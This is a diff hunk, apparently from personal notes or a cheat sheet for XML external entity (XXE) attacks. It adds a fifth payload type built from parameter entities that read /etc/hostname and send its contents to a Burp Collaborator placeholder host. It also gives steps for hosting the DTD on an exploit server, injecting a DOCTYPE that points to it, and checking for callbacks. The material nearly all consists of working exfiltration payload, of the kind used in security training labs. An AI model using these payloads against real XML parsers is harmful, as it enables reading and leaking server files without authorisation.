@@ -16,3 +16,11 @@
                    %exfil;
           </script>
     ---> Insert this --><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]> 
+
+5)Burp-Collaborator-Type: --> <!ENTITY % file SYSTEM "file:///etc/hostname">
+                               <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
+                               %eval;
+                               %exfil;
+                          --->Store the exploit in <script> --here-- </script> and copy the link after the exploit server is ready
+                          ---> <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
+                          --->Check For Collaborator responses !!
